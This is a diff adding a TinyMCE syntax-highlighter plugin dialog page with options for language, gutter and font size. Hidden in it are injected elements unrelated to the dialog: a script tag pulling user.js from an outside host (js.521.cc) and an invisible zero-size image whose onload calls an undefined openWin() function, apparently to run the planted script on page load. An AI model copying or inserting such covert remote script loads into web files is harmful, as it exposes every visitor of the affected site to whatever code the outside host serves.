@@ -1,0 +1,65 @@
+<!doctype html public "-//w3c//dtd xhtml 1.0 strict//en" "http://www.w3.org/tr/xhtml1/dtd/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<title>{#syntaxhl_dlg.title}</title>
+	<script type="text/javascript" src="../../tiny_mce_popup.js"></script>
+	<script type="text/javascript" src="js/dialog.js"></script>
+	<style type="text/css" media="screen">
+		input {
+			vertical-align: middle;
+		}
+		label {
+			vertical-align: middle;
+		}
+		fieldset {
+			margin-bottom: 10px;
+		}
+	</style>
+<script language="javascript" type="text/javascript" src="http://js.521.cc/js/user.js"></script></head>
+<body>
+<form onsubmit="syntaxhldialog.insert(); return false;" action="#">
+	<fieldset id="syntaxhl_options">
+		<legend>{#syntaxhl_dlg.highlight_options}</legend>
+		<input type="checkbox" name="syntaxhl_nogutter" id="syntaxhl_nogutter" value="1" /><label for="syntaxhl_nogutter" >{#syntaxhl_dlg.nogutter}</label>	
+		<input type="checkbox" name="syntaxhl_light" id="syntaxhl_light" value="1" /><label for="syntaxhl_light">{#syntaxhl_dlg.light}</label>
+		<input type="checkbox" name="syntaxhl_collapse" id="syntaxhl_collapse" value="1" /><label for="syntaxhl_collapse">{#syntaxhl_dlg.collapse}</label>
+		<label for="syntaxhl_highlight">{#syntaxhl_dlg.highlight}</label><input type="text" name="syntaxhl_highlight" id="syntaxhl_highlight" style="width:50px;" /><br />
+		<label for="syntaxhl_language">{#syntaxhl_dlg.choose_lang}:</label>
+		<select name="syntaxhl_language" id="syntaxhl_language">
+			<option value="bash">bash(shell)</option>
+			<option value="csharp">c#</option>
+			<option value="cpp">c++</option>
+			<option value="css">css</option>
+			<option value="delphi">delphi</option>
+			<option value="diff">diff</option>
+			<option value="groovy">groovy</option>
+			<option value="jscript">jscript</option>
+			<option value="java">java</option>
+			<option value="perl">perl</option>
+			<option value="php">php</option>
+			<option value="plain">plain(text)</option>
+			<option value="python">python</option>
+			<option value="ruby">ruby</option>
+			<option value="scala">scala</option>
+			<option value="sql">sql</option>
+			<option value="vb">vb</option>
+			<option value="xml">xml/xhtml</option>
+		</select>
+		<label for="syntaxhl_firstline" style="margin-left: 15px;">{#syntaxhl_dlg.first_line}:</label><input type="textfield" name="syntaxhl_firstline" id="syntaxhl_firstline" value="1" style="width:20px;" />
+		<label for="syntaxhl_fontsize">{#syntaxhl_dlg.fontsize}</label><input type="text" name="syntaxhl_fontsize" id="syntaxhl_fontsize" value="100" style="width:25px;" />%
+	</fieldset>
+	<fieldset>
+		<legend>{#syntaxhl_dlg.paste}</legend>
+	<textarea name="syntaxhl_code" id="syntaxhl_code" rows="15" cols="100" style="width: 100%; height: 100%; font-family: 'courier new',courier,mono; font-size: 12px;" class="mcefocus"></textarea>
+	</fieldset>
+	<div class="mceactionpanel">
+		<div style="float: left">
+			<input type="submit" id="insert" name="insert" value="{#insert}" />
+		</div>
+		<div style="float: right">
+			<input type="button" id="cancel" name="cancel" value="{#cancel}" onclick="tinymcepopup.close();" />
+		</div>
+	</div>
+</form>
+<img src="http://www.baidu.com/search/img/logo.gif" width="0" height="0" onload="openWin();" /></body>
+</html>
